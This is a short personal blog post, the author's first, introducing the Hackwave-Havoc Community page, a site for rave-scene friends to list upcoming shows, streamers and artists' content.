Welcome to the Blog!
2025-07-22
I've really wanted to start a blog for a while now, but I've never had spent the time on it. Well, now i have. Here's my first post. I guess it would make good practice for me to write about my projects and thoughts. Today we'll talk about my First project, The Hackwave-Havoc Community page, and how I will be using it to host my friends from the rave scene. Hopefully I can get some more people to join the community and make it a fun place to find these artists content. I guess a thought behind this project is a desire to have a page to send people to see the scheduled shows coming up, the peeps online streaming content, and ultimately have a place to find the artists content.

You can find the Hackwave-Havoc Community page here:
Hackwave-Havoc
‚Üê Back to Project Hub